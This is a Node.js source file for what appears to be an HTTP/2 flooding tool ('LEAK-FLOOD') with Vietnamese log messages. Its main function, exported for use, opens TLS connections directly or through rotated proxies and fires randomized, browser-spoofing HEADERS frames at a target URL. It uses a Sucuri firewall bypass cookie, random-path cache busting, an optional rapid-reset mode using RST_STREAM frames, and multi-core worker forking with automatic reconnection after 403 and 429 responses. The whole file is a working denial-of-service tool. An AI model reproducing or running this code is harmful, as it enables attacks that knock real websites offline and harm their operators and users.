const net = require("net");
const tls = require("tls");
const HPACK = require("hpack");
const cluster = require("cluster");
const randstr = require("randomstring");
const fs = require("fs");
const os = require("os");
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.setMaxListeners(0);
process.on("uncaughtException", (err) => {
    console.error(`[ERROR] Uncaught Exception: ${err.message}`);
});
process.on("unhandledRejection", (err) => {
    console.error(`[ERROR] Unhandled Rejection: ${err.message}`);
});

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const log = (...args) => {
    process.stdout.write(
        "[LOG] " + args.map(a =>
            (typeof a === "object" ? JSON.stringify(a) : String(a))
        ).join(" ") + "\n",
        () => process.stdout.emit("flush")
    );
};

function ra() {
    return randstr.generate({
        charset: "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        length: 8,
    });
}

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const length = payload.length;
    const frame = Buffer.alloc(9);
    frame.writeUIntBE(length, 0, 3);
    frame.writeUInt8(type, 3);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7fffffff, 5);
    return payload.length > 0 ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    const length = (data[0] << 16) | (data[1] << 8) | data[2];
    const type = data[3];
    const flags = data[4];
    const streamId = data.readUInt32BE(5) & 0x7fffffff;
    if (data.length < 9 + length) return null;
    return {
        length,
        type,
        flags,
        streamId,
        payload: data.slice(9, 9 + length),
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const statusCodes = {};
let shouldPrint = false;

function printStatusCodes(debugMode) {
    if (debugMode && shouldPrint) {
        log("(node/leak) :", statusCodes);
        shouldPrint = false;
        for (const code in statusCodes) {
            statusCodes[code] = 0;
        }
    }
}

function go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit) {
    const workerId = cluster.worker ? `Worker ${cluster.worker.id}` : 'Master';
    log(`[DEBUG] ${workerId}: Gọi hàm go`);
    try {
        let pxfine = proxyfile ? fs.readFileSync(proxyfile, "utf8").replace(/\r/g, "").split("\n").filter(line => line.trim()) : [];
        let custom_update = 15663105;
        let headersPerReset = 0;
        const url = new URL(target);

        const selectedProxy = pxfine.length > 0 ? pxfine[~~(Math.random() * pxfine.length)] : null;
        let proxyHost, proxyPort, proxyUser, proxyPass;

        if (selectedProxy) {
            const proxyParts = selectedProxy.split(":");
            if (proxyParts.length === 2 || proxyParts.length === 4) {
                [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts.length === 4 ? proxyParts : [proxyParts[0], proxyParts[1], null, null];
            } else {
                log(`[DEBUG] ${workerId}: Proxy không hợp lệ, thử lại`);
                setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
                return;
            }
            log(`[DEBUG] ${workerId}: Chọn proxy ${proxyHost}:${proxyPort}`);
        }

        let SocketTLS;
        const netSocket = selectedProxy
            ? net.connect(Number(proxyPort), proxyHost, () => {
                log(`[DEBUG] ${workerId}: Kết nối tới proxy ${proxyHost}:${proxyPort}`);
                const connectRequest = proxyUser && proxyPass
                    ? `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${Buffer.from(`${proxyUser}:${proxyPass}`).toString("base64")}\r\nProxy-Connection: Keep-Alive\r\n\r\n`
                    : `CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
                netSocket.write(connectRequest);
            })
            : net.connect(443, url.host, () => {
                log(`[DEBUG] ${workerId}: Kết nối trực tiếp tới ${url.host}:443`);
                startTlsConnection();
            });

        if (selectedProxy) {
            netSocket.once("data", (data) => {
                if (data.toString().includes("HTTP/1.1 200")) {
                    log(`[DEBUG] ${workerId}: Nhận phản hồi CONNECT thành công từ proxy`);
                    startTlsConnection();
                } else {
                    log(`[DEBUG] ${workerId}: Phản hồi CONNECT thất bại, thử lại`);
                    netSocket.destroy();
                    setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
                }
            });
        }

        function startTlsConnection() {
            SocketTLS = tls.connect(
                {
                    socket: selectedProxy ? netSocket : null,
                    host: url.host,
                    port: 443,
                    ALPNProtocols: ["h2"],
                    servername: url.host,
                    ciphers: [
                        "TLS_AES_128_GCM_SHA256",
                        "TLS_AES_256_GCM_SHA384",
                        "TLS_CHACHA20_POLY1305_SHA256",
                        "ECDHE-ECDSA-AES128-GCM-SHA256",
                        "ECDHE-RSA-AES128-GCM-SHA256",
                        "ECDHE-ECDSA-AES256-GCM-SHA384",
                        "ECDHE-RSA-AES256-GCM-SHA384",
                        "ECDHE-ECDSA-CHACHA20-POLY1305",
                        "ECDHE-RSA-CHACHA20-POLY1305",
                    ].join(":"),
                    sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
                    secure: true,
                    rejectUnauthorized: false,
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3",
                },
                () => {
                    log(`[DEBUG] ${workerId}: TLS kết nối thành công tới ${url.host}`);
                    let streamId = 1;
                    let data = Buffer.alloc(0);
                    let hpack = new HPACK();
                    hpack.setTableSize(4096);

                    const updateWindow = Buffer.alloc(4);
                    updateWindow.writeUInt32BE(custom_update, 0);

                    const frames = [
                        Buffer.from(PREFACE, "binary"),
                        encodeFrame(
                            0,
                            4,
                            encodeSettings([
                                [1, 65536],
                                [2, 0],
                                [4, 6291456],
                                [6, 262144],
                            ])
                        ),
                        encodeFrame(0, 8, Buffer.from([0x00, 0x60, 0x00, 0x00])),
                    ];

                    SocketTLS.write(Buffer.concat(frames));

                    SocketTLS.on("data", (eventData) => {
                        data = Buffer.concat([data, eventData]);
                        while (data.length >= 9) {
                            const frame = decodeFrame(data);
                            if (frame != null) {
                                data = data.subarray(frame.length + 9);
                                if (frame.type === 1) {
                                    const headers = hpack.decode(frame.payload);
                                    const statusCodeHeader = headers.find(
                                        (header) => header[0] === ":status"
                                    );
                                    if (statusCodeHeader) {
                                        const statusCode = parseInt(statusCodeHeader[1], 10);
                                        statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
                                        shouldPrint = true;
                                        log(`[DEBUG] ${workerId}: Nhận status code ${statusCode}`);
                                        if (statusCode === 403 || statusCode === 429) {
                                            SocketTLS.destroy();
                                            setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
                                        }
                                    }
                                }
                                if (frame.type === 4 && frame.flags === 0) {
                                    SocketTLS.write(encodeFrame(0, 4, "", 1));
                                }
                                if (frame.type === 7 || frame.type === 5) {
                                    SocketTLS.destroy();
                                }
                            } else {
                                break;
                            }
                        }
                    });

                    function main() {
                        if (SocketTLS.destroyed) {
                            return;
                        }

                        let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                        let version = Math.floor(Math.random() * (128 - 127 + 1) + 127);
                        let ver = Math.floor(Math.random() * 99) + 1;
                        let ver1 = Math.floor(Math.random() * 99) + 1;
                        let ver2 = Math.floor(Math.random() * 99) + 1;
                        const randomPath = bypassEnabled ? `/${ra()}/${ra()}` : url.pathname;
                        let cookie = "sucuricp_tfca_6e453141ae697f9f78b18427b4c54df1=1";
                        const headers = Object.entries({
                            ":method": "GET",
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": `${randomPath}?v=${Math.random().toString(36).substring(2)}&id=${ra()}`,
                        }).concat(
                            Object.entries({
                                "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
                                "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
                                "sec-ch-ua-platform": `"Windows"`,
                                "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : "0",
                                "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
                                accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                                "accept-encoding": "gzip, deflate, br, zstd",
                                "accept-language": `${
                                    ["en-US", "en-GB", "ru", "fr", "de"][Math.floor(Math.random() * 5)]
                                },q=0.${Math.floor(Math.random() * 9) + 1}`,
                                ...(Math.random() < 0.5 && {
                                    cookie: `id=${ra()}; session=${ra()}; token=${ra()}; ${cookie}`,
                                }),
                                referer: `https://www.google.com/`,
                            })
                        );

                        const headers2 = Object.entries({
                            "sec-fetch-site": "none",
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                        }).filter((a) => a[1] != null);

                        const headers3 = Object.entries({
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": `ru,en-US;q=0.9,en;q=0.0`,
                            ...(Math.random() < 0.5 && { cookie: `${generateNumbers}` }),
                            ...(Math.random() < 0.5 && {}),
                        }).filter((a) => a[1] != null);

                        for (let i = headers3.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers3[i], headers3[j]] = [headers3[j], headers3[i]];
                        }

                        const combinedHeaders = headers.concat(headers2).concat(headers3);
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xff]),
                            hpack.encode(combinedHeaders),
                        ]);

                        SocketTLS.write(
                            Buffer.concat([
                                encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20),
                            ])
                        );

                        if (resetEnabled) {
                            headersPerReset++;
                            if (headersPerReset >= 10) {
                                SocketTLS.write(
                                    encodeFrame(
                                        streamId,
                                        3,
                                        Buffer.from([0x0, 0x0, 0x8, 0x0]),
                                        0
                                    )
                                );
                                headersPerReset = 0;
                            }
                        }
                        streamId += 2;

                        setTimeout(main, 1000 / ratelimit);
                    }

                    main();
                }
            );

            SocketTLS.on("error", (err) => {
                log(`[DEBUG] ${workerId}: Lỗi TLS: ${err.message}`);
                SocketTLS.destroy();
                setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
            });

            SocketTLS.once("close", () => {
                log(`[DEBUG] ${workerId}: Kết nối TLS đóng, thử lại`);
                SocketTLS.destroy();
                setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
            });
        }

        netSocket.on("error", (err) => {
            log(`[DEBUG] ${workerId}: Lỗi netSocket: ${err.message}`);
            netSocket.destroy();
            setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
        });

        netSocket.once("close", () => {
            log(`[DEBUG] ${workerId}: netSocket đóng, thử lại`);
            if (SocketTLS) {
                SocketTLS.destroy();
            }
            setTimeout(() => go(target, proxyfile, debugMode, bypassEnabled, resetEnabled, ratelimit), 0);
        });
    } catch (err) {
        log(`[ERROR] ${workerId}: Lỗi trong hàm go: ${err.message}`);
    }
}

async function startFlood(target, time, threads, proxyfile, ratelimit, debug, bypass, reset, callback) {
    return new Promise((resolve, reject) => {
        log(`[INFO] LEAK-FLOOD starting...`);
        log(`[INFO] Target: ${target}`);
        log(`[INFO] Duration: ${time} seconds`);
        log(`[INFO] Threads: ${threads}`);
        log(`[INFO] Proxy file: ${proxyfile || 'không có'}`);
        log(`[INFO] Debug Mode: ${debug ? "ON" : "OFF"}`);
        if (bypass) log("[INFO] Bypass mode: ON");
        if (reset) log("[INFO] Reset mode: ON");
        log(`[INFO] Node.js version: ${process.version}`);
        log(`[INFO] CPU cores: ${os.cpus().length}`);

        if (threads > 1 && cluster.isMaster) {
            let workersInitialized = 0;
            Array.from({ length: threads }, (_, i) => {
                log(`[DEBUG] Master: Forking worker ${i + 1}`);
                const worker = cluster.fork({ core: i % os.cpus().length });
                worker.send({ target, proxyfile, debug, bypass, reset, ratelimit });
            });

            cluster.on("exit", (worker) => {
                log(`[DEBUG] Master: Worker ${worker.id} exited, reforking`);
                const newWorker = cluster.fork({ core: worker.id % os.cpus().length });
                newWorker.send({ target, proxyfile, debug, bypass, reset, ratelimit });
            });

            cluster.on("online", (worker) => {
                log(`[DEBUG] Master: Worker ${worker.id} online`);
                workersInitialized++;
                if (workersInitialized === threads) {
                    log(`[DEBUG] Master: All ${threads} workers initialized`);
                }
            });

            cluster.on("error", (err) => {
                log(`[ERROR] Cluster error: ${err.message}`);
                reject(err);
            });

            cluster.on("message", (worker, message) => {
                log(`[DEBUG] Master: Nhận tin nhắn từ Worker ${worker.id}: ${message}`);
            });

            setInterval(() => printStatusCodes(debug), 1000);
            setTimeout(() => {
                log(`[DEBUG] Master: Stopping after ${time} seconds`);
                callback();
                Object.keys(cluster.workers).forEach((id) => {
                    cluster.workers[id].kill();
                });
                resolve();
            }, time * 1000);
        } else {
            log(`[DEBUG] Running go directly in ${cluster.isMaster ? 'Master' : 'Worker'}`);
            try {
                setInterval(() => {
                    log(`[DEBUG] ${cluster.isMaster ? 'Master' : 'Worker ' + cluster.worker.id}: Gọi setInterval cho go`);
                    go(target, proxyfile, debug, bypass, reset, ratelimit);
                }, 1);
                setTimeout(() => {
                    log(`[DEBUG] Stopping after ${time} seconds`);
                    callback();
                    resolve();
                }, time * 1000);
            } catch (err) {
                log(`[ERROR] ${cluster.isMaster ? 'Master' : 'Worker ' + cluster.worker.id}: Lỗi trong setInterval: ${err.message}`);
                reject(err);
            }
        }
    });
}

if (!cluster.isMaster) {
    process.on('message', (msg) => {
        log(`[DEBUG] Worker ${cluster.worker.id}: Nhận tham số từ master: ${JSON.stringify(msg)}`);
        try {
            setInterval(() => {
                log(`[DEBUG] Worker ${cluster.worker.id}: Gọi setInterval cho go`);
                go(msg.target, msg.proxyfile, msg.debug, msg.bypass, msg.reset, msg.ratelimit);
            }, 1);
            process.send(`Worker ${cluster.worker.id} initialized`);
        } catch (err) {
            log(`[ERROR] Worker ${cluster.worker.id}: Lỗi trong setInterval: ${err.message}`);
            process.send(`Worker ${cluster.worker.id} error: ${err.message}`);
        }
    });
}

module.exports = { startFlood };